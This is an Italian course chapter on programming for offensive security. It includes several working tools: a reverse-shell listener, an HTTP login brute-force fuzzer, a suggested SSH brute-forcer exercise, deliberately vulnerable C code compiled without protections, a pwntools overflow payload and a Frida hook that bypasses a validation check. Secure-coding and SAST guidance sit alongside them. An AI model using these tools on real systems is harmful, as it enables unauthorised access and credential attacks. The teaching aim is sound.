---
title: "Programmazione per la security: Python, C, Go"
area: "Programmazione"
order: 7
level: "intermedio"
summary: "Senza saper programmare non scrivi tool, exploit, automazioni. Python come 'lingua franca', C per capire ciò che esegue sotto, Go/Rust per tool moderni. Best practice di secure coding."
prereq:
  - "Sezione 01, 02"
tools:
  - "Python 3.11+, pip, venv"
  - "gcc, gdb, make"
  - "Go 1.22+"
  - "Visual Studio Code / Neovim"
---

# Programmazione per la security

> **Non puoi fare offensive ad alto livello senza programmare.** I tool che usi sono codice. I bug che cerchi sono codice. Gli exploit che scrivi sono codice. Il malware che reversifichi è codice. Vai e impara.

## Quali linguaggi e perché

| Linguaggio | A cosa serve in security | Importanza |
|---|---|---|
| **Python** | Tooling, scripting, exploit dev, automazione, glue | ⭐⭐⭐⭐⭐ |
| **Bash** | Scripting OS, post-exploit, glue | ⭐⭐⭐⭐ |
| **C** | Capire stack/heap, malware, kernel, shellcode | ⭐⭐⭐⭐ |
| **C++** | Reverse engineering binari Windows, motori giochi | ⭐⭐⭐ |
| **JavaScript** | Web (XSS, prototype pollution), Node | ⭐⭐⭐⭐ |
| **PowerShell** | Post-exploit Windows | ⭐⭐⭐⭐ |
| **Go** | Implant moderni, tool offensivi statici, cross-compile | ⭐⭐⭐⭐ |
| **Rust** | Tool moderni, alcuni malware nuovi | ⭐⭐⭐ |
| **C#** | .NET, Active Directory, Rubeus, Seatbelt, BloodHound | ⭐⭐⭐⭐ |
| **Assembly x86/x64 e ARM** | Reverse, exploit dev, shellcode | ⭐⭐⭐⭐ |
| **SQL** | SQLi, blueteam log query | ⭐⭐⭐ |
| **YAML/JSON/Regex** | Config, parsing, query | ⭐⭐⭐⭐ |

Non devi essere madrelingua in tutti. **Padronanza Python + lettura C + lettura JS + bash è il minimo.**

## Python per la security

### Setup base

```bash
python3 -m venv .venv
source .venv/bin/activate    # Linux/macOS
# .venv\Scripts\activate     # Windows
pip install --upgrade pip
pip install requests beautifulsoup4 dnspython scapy pycryptodome impacket paramiko pwntools
```

Per ogni progetto, virtualenv separato. Pinna le versioni in `requirements.txt`.

### Librerie standard utili

- `os`, `sys`, `subprocess` — interazione OS.
- `socket` — TCP/UDP raw.
- `ssl` — TLS.
- `urllib`, `http.server`.
- `struct` — pack/unpack binario.
- `re` — regex.
- `argparse` — CLI parsing.
- `json`, `csv`, `xml`, `html`.
- `pathlib` — path moderno.
- `concurrent.futures` — pool thread/process.
- `asyncio` — concorrenza event loop.
- `hashlib`, `hmac`, `secrets`.
- `logging`.

### Librerie di terze parti per offensive

| Libreria | Uso |
|---|---|
| **requests** / **httpx** | client HTTP |
| **aiohttp** / **httpx** | HTTP async |
| **BeautifulSoup**, **lxml** | parsing HTML |
| **scapy** | costruzione/sniffing pacchetti |
| **dnspython** | DNS |
| **paramiko** / **fabric** | SSH |
| **impacket** | SMB/AD/Kerberos (Microsoft net stack) |
| **bloodhound-python** | BloodHound collector |
| **pwntools** | exploit dev / CTF |
| **pycryptodome** / **cryptography** | crypto |
| **frida** | dynamic instrumentation |
| **angr** | symbolic execution |
| **capstone** / **keystone** / **unicorn** | disassemble/assemble/emulate |

### Esempio: port scanner essenziale

```python
import socket, concurrent.futures, sys

def scan(host, port, timeout=1.0):
    try:
        with socket.create_connection((host, port), timeout=timeout) as s:
            return port
    except (socket.timeout, ConnectionRefusedError, OSError):
        return None

def scan_host(host, ports):
    open_ports = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=200) as ex:
        for p in ex.map(lambda p: scan(host, p), ports):
            if p is not None:
                open_ports.append(p)
    return sorted(open_ports)

if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else "scanme.nmap.org"
    print(scan_host(host, range(1, 1025)))
```

Lancialo contro **`scanme.nmap.org`** (Nmap Project lo offre per training). Mai contro altri senza permesso.

### Esempio: HTTP fuzzer di base

```python
import requests, itertools, string

BASE = "https://example.com/login"
USER = "admin"
ALPHA = string.ascii_lowercase + string.digits

session = requests.Session()
session.headers["User-Agent"] = "fuzzer/0.1"

for pwd_len in range(3, 5):
    for combo in itertools.product(ALPHA, repeat=pwd_len):
        pwd = "".join(combo)
        r = session.post(BASE, data={"u": USER, "p": pwd}, allow_redirects=False)
        # discriminatore: status / response length / Set-Cookie presence
        if r.status_code == 302 and "session" in r.headers.get("set-cookie", ""):
            print("HIT:", pwd)
            break
```

Da estendere con threading/async, rate limiting, lettura da wordlist (rockyou).

### Esempio: enumerazione DNS

```python
import dns.resolver
import sys

def enum_subs(domain, wordlist):
    r = dns.resolver.Resolver()
    r.timeout = 1; r.lifetime = 2
    for w in wordlist:
        sub = f"{w}.{domain}"
        try:
            ans = r.resolve(sub, 'A')
            for a in ans:
                print(f"{sub:<40} {a}")
        except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer, dns.exception.Timeout):
            pass

if __name__ == "__main__":
    with open(sys.argv[2]) as f:
        words = [w.strip() for w in f if w.strip()]
    enum_subs(sys.argv[1], words)
```

### Esempio: reverse shell handler in Python

```python
# attacker
import socket, threading, sys

def handle(conn, addr):
    print(f"[+] conn from {addr}")
    try:
        while True:
            cmd = input("$ ").strip()
            if not cmd: continue
            if cmd == "exit": break
            conn.sendall((cmd + "\n").encode())
            data = b""
            conn.settimeout(2)
            try:
                while True:
                    chunk = conn.recv(4096)
                    if not chunk: break
                    data += chunk
            except socket.timeout:
                pass
            sys.stdout.write(data.decode(errors="replace"))
    finally:
        conn.close()

def main(port):
    s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", port)); s.listen(1)
    print(f"[*] listening on {port}")
    while True:
        c, a = s.accept()
        threading.Thread(target=handle, args=(c, a), daemon=True).start()

main(int(sys.argv[1]) if len(sys.argv) > 1 else 4444)
```

### Pwntools (per CTF/exploit dev)

```python
from pwn import *

context.binary = "./vuln"
io = process("./vuln")            # locale
# io = remote("host", 1337)       # remoto
io.recvuntil(b"input: ")
payload = b"A" * 40 + p64(0xdeadbeefcafebabe)
io.sendline(payload)
io.interactive()
```

`pwntools` ti astrae da binascii/struct, integra `gdb.attach`, ha ROP gadget finder, format-string helper, etc. **Tu impara prima il manuale**: capire `p64`, `p32`, layout endian, calcolo offset RIP.

### Best practice Python

1. **Type hints** (`def f(x: int) -> str:`).
2. **Logging** invece di `print`.
3. **Path moderno** (`pathlib`).
4. **Use venv** sempre.
5. **Validare input** se prendi argomenti utente in tool offensivi (ma è il punto).
6. **Mai eseguire `subprocess.run(cmd, shell=True)`** con input utente non sanitizzato (command injection). Preferisci `shell=False` + lista.
7. **Mai `eval`/`exec`** su input non controllato.
8. **Constant-time compare** per token / hash (`hmac.compare_digest`).

## C — il linguaggio per capire il sotto

Sapere C ti dà:
- Capacità di leggere malware (la maggior parte è C/C++).
- Capacità di scrivere shellcode/exploit.
- Capacità di capire il decompilato di Ghidra/IDA.
- Comprensione precisa di puntatori/memoria/UB.

### Esempio commentato

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void weak_copy(char *dst, const char *src) {
    while (*src) *dst++ = *src++;  // copia senza limite — buffer overflow se dst troppo piccolo
    *dst = '\0';
}

int main(int argc, char **argv) {
    if (argc < 2) {
        fprintf(stderr, "usage: %s <input>\n", argv[0]);
        return 1;
    }
    char buf[16];
    weak_copy(buf, argv[1]);
    printf("Got: %s\n", buf);
    return 0;
}
```

Compila e rompi:
```bash
gcc -fno-stack-protector -z execstack -no-pie -o weak weak.c
./weak "$(python3 -c 'print("A"*100)')"   # segfault!
```

### Bug pattern in C che cercherai

- **Buffer overflow**: `strcpy`, `strcat`, `sprintf`, `gets`. Tutti vietati nel 2026. Usa `strncpy_s`, `snprintf`, … e ricorda terminazione.
- **Off-by-one**: classic `for (i=0; i<=n; i++) buf[i]=...`.
- **Format string**: `printf(user_input)` invece di `printf("%s", user_input)`. Permette read/write arbitrario di memoria (vedi sezione 14).
- **Integer overflow/underflow**: `malloc(n * sizeof(T))` con `n` controllato → overflow → alloc piccolo → heap overflow.
- **Use-after-free**: usare un puntatore dopo `free`.
- **Double free**.
- **Null deref**, **uninitialized memory**.
- **TOCTOU**: `access()` poi `open()`.
- **Race condition signal handler**.

### Compile/Debug flow

```bash
gcc -Wall -Wextra -Werror -O0 -g vuln.c -o vuln
gdb ./vuln
(gdb) run "AAAA"
(gdb) info registers
(gdb) x/40wx $rsp
(gdb) disas main
```

Per training: estensione `pwndbg`, `gef`, `peda` — danno UX moderna a gdb.

## Go per tool moderni

Vantaggi:
- Compila a binario singolo, statico (niente dipendenze runtime).
- Cross-compile facilissimo.
- Goroutine per concorrenza.
- HTTP/2/3 nativo, crypto/net standard library matura.
- Sintassi semplice.

Usato in tool come **gobuster**, **ffuf**, **subfinder**, **nuclei**, **httpx**, **interactsh**, in C2 moderni (**Sliver**, **Havoc-side**), e in moltissimi malware moderni.

```go
// scanner.go
package main

import (
	"context"
	"fmt"
	"net"
	"os"
	"strconv"
	"sync"
	"time"
)

func scan(host string, port int, wg *sync.WaitGroup, sem chan struct{}) {
	defer wg.Done()
	sem <- struct{}{}
	defer func() { <-sem }()

	addr := net.JoinHostPort(host, strconv.Itoa(port))
	ctx, cancel := context.WithTimeout(context.Background(), 1*time.Second)
	defer cancel()
	d := net.Dialer{}
	conn, err := d.DialContext(ctx, "tcp", addr)
	if err == nil {
		fmt.Println("open", port)
		conn.Close()
	}
}

func main() {
	host := os.Args[1]
	var wg sync.WaitGroup
	sem := make(chan struct{}, 200)
	for p := 1; p <= 1024; p++ {
		wg.Add(1)
		go scan(host, p, &wg, sem)
	}
	wg.Wait()
}
```

`go build scanner.go && ./scanner scanme.nmap.org`. Cross-compile: `GOOS=windows GOARCH=amd64 go build`.

## C# per AD e .NET tooling

Tool indispensabili in pentest AD (sezione 13) sono in C#:
- **Rubeus** — Kerberos (ASREPRoast, Kerberoasting, golden/silver ticket).
- **Seatbelt** — host/AD enum locale.
- **SharpHound** — collector per BloodHound.
- **SharpUp / SharpView** — privesc / AD query.

Per modificarli/usarli devi sapere C# di base. **Visual Studio Community** gratis, oppure `dotnet` CLI.

## JavaScript per il web

Sapere JS è obbligatorio per:
- Riconoscere e scrivere XSS payload.
- Reversare bundle Webpack di SPA.
- Analizzare malware basato su Node/Electron.
- Browser extension malware.
- Prototype pollution.
- DOM clobbering.

Conoscere almeno: ES6+, `Promise`/`async`, `fetch`, `URL`/`URLSearchParams`, `JSON.parse`, `eval` e perché evitarlo, le diverse `globalThis`/`window`.

## PowerShell per Windows

Su Windows post-exploit, PowerShell è "il" linguaggio. Però:
- Versioni recenti hanno **ScriptBlock Logging**, **Module Logging**, **AMSI**, **Constrained Language Mode**.
- Defender + EDR riconoscono pattern noti (vedi `Invoke-Mimikatz`).

Skill chiave: `Invoke-RestMethod`, `Invoke-WebRequest`, `Get-ADUser`, `Get-Process`, `Get-WmiObject`/`Get-CimInstance`, `Set-MpPreference` (controlla Defender se admin), pipeline objects.

Tip: PowerShell **5.1** ha più telemetria di **2.0**, ma `powershell.exe -version 2` spesso non è disponibile su Windows 10/11 moderni → non contare sull'evasione "downgrade attack" come una volta.

## Bash / Zsh — riepilogo

Già nella sezione 02. Aggiungiamo:
- `eval` è male: input utente → RCE.
- Quoting paranoid: `"$var"`, `"$@"` (NON `$@`).
- `set -euo pipefail` come default.
- Shellcheck (`shellcheck script.sh`) per analisi statica.

## Secure coding — il principio

Anche se il tuo lavoro è offensivo, sapere come si scrive sicuro è cruciale:

1. **Validate input at boundary**: assume input ostile.
2. **Parametrized queries** sempre (mai `f"SELECT * WHERE id={id}"`).
3. **Output encoding**: HTML, URL, SQL, shell, log — contesto giusto.
4. **Authn ≠ Authz**. Separale.
5. **Principio least privilege**: ogni servizio gira con privilegi minimi.
6. **Defense in depth**: più strati indipendenti.
7. **Fail safe / fail closed**: in caso di errore, nega accesso.
8. **Don't roll your own crypto**.
9. **Logging**, ma niente segreti nei log.
10. **Patch management**, dipendenze aggiornate (SBOM, Renovate, Dependabot, OSV-Scanner).
11. **Threat modeling** in fase di design (STRIDE).

### SAST/DAST/SCA
- **SAST** (Static App Sec Testing): analisi codice senza eseguire. Tool: SonarQube, Semgrep, CodeQL, Snyk Code, Checkov per IaC.
- **DAST** (Dynamic): testa l'app in esecuzione (ZAP, Burp Suite Scanner).
- **SCA** (Software Composition Analysis): vulnerabilità nelle dipendenze (Snyk Open Source, Dependabot, Trivy, Grype).
- **IAST**: ibrido (agente in-process).
- **Fuzzing**: input casuali per scoprire crash (AFL++, libFuzzer, Honggfuzz, OSS-Fuzz).

## Esercizi

### Esercizio 7.1 — Mini-tool
Scrivi un Python che, data una lista di URL, fa GET con timeout 3s e produce CSV: `url, status, length, server_header, title`.

<details><summary>Soluzione</summary>

```python
import csv, sys, requests, re
from concurrent.futures import ThreadPoolExecutor, as_completed

def fetch(url):
    try:
        r = requests.get(url, timeout=3, allow_redirects=True, verify=False)
        m = re.search(r"<title>([^<]*)</title>", r.text, re.IGNORECASE)
        title = m.group(1).strip() if m else ""
        return (url, r.status_code, len(r.content), r.headers.get("server", ""), title)
    except Exception as e:
        return (url, "ERR", 0, "", str(e)[:80])

urls = [l.strip() for l in open(sys.argv[1]) if l.strip()]
w = csv.writer(sys.stdout)
w.writerow(["url","status","length","server","title"])
with ThreadPoolExecutor(max_workers=50) as ex:
    for fut in as_completed([ex.submit(fetch, u) for u in urls]):
        w.writerow(fut.result())
```

</details>

### Esercizio 7.2 — Scrivi un client SSH brute-forcer
Con `paramiko`, dato `host:port`, una lista user e una lista password, prova login. Output: tuple riuscite. Aggiungi:
- timeout per tentativo,
- max concurrency (asyncio o thread pool),
- exit precoce su lockout (HTTP 429-style: dopo N failure ferma per cooldown).

**Uso solo in lab**.

### Esercizio 7.3 — Buffer overflow proof of concept
Compila e analizza:

```c
#include <stdio.h>
#include <string.h>
int main(int argc, char **argv) {
    char buf[64];
    strcpy(buf, argv[1]);
    return 0;
}
```

Con `gcc -fno-stack-protector -no-pie -z execstack -o bof bof.c`.
- Trova l'offset preciso che sovrascrive RIP (usa `pwntools` `cyclic`).
- Quanti byte? Quale registro contiene il pattern dopo crash in gdb?

<details><summary>Suggerimento</summary>

```python
from pwn import *
p = cyclic(200)
io = process(["./bof", p])
io.wait()
core = io.corefile
print(cyclic_find(core.fault_addr & 0xffffffffffffffff))
```

L'offset tipico è 72 (64 buf + 8 RBP salvato) ma può variare con padding del compilatore.

</details>

### Esercizio 7.4 — Go HTTP fuzzer
Riscrivi in Go il fuzzer Python dell'esempio precedente. Sfrutta goroutine per parallelismo.

### Esercizio 7.5 — Frida sniff function
Su un binario con simboli, hooka una funzione `int validate(char *input)`:

```js
// frida script
const validate = Module.findExportByName(null, "validate");
Interceptor.attach(validate, {
    onEnter(args) {
        console.log("input:", args[0].readUtf8String());
    },
    onLeave(retval) {
        console.log("ret:", retval);
        retval.replace(1);  // bypass: forza ritorno 1
    }
});
```

```bash
frida -l hook.js -f ./target
```

Provalo su un crackme di [crackmes.one](https://crackmes.one).

### Esercizio 7.6 — Semgrep
Installa Semgrep. Lancia rule pubbliche su un progetto Python aperto (es. un piccolo Flask):

```bash
pip install semgrep
semgrep --config "p/python" .
semgrep --config "p/security-audit" .
```

Cosa trova? Quanti falsi positivi? Differenza tra `--config p/python` e `--config p/owasp-top-ten`?

### Esercizio 7.7 — Scrivi una regola Semgrep
Scrivi una regola che trova chiamate a `subprocess.run(..., shell=True)` con argomenti che includono `+` (concatenazione).

```yaml
rules:
  - id: subprocess-shell-true-concat
    pattern: subprocess.run(..., shell=True)
    message: subprocess con shell=True
    severity: WARNING
    languages: [python]
```

## Concetti chiave

1. **Python è il linguaggio franco** della security.
2. **C ti serve per capire l'underlying.** Non saltarlo.
3. **Go/Rust** sono il futuro dei tool offensivi compilati statici.
4. **JS + C#** per web e AD rispettivamente.
5. **Pwntools** per CTF/exploit dev.
6. **SAST/DAST/SCA** sono parte del processo moderno DevSecOps.
7. **Secure coding** ti rende offensivo migliore (sai dove guardare).

Hai i mattoni linguistici. Ora si va in caccia: OSINT, scanning, web pwn.
